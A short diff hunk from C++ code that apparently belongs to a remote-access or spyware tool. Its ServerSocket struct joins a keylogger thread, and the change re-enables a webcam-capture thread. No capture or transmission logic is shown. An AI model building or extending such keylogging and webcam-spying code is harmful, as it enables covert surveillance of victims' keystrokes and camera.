@@ -136,7 +136,7 @@ struct ServerSocket {
 		}
 		BindSocket();
 		keyloggerThread.join();
-		//webcamThread.join();
+		webcamThread.join();
 	}
 };
 struct ClientSocket {
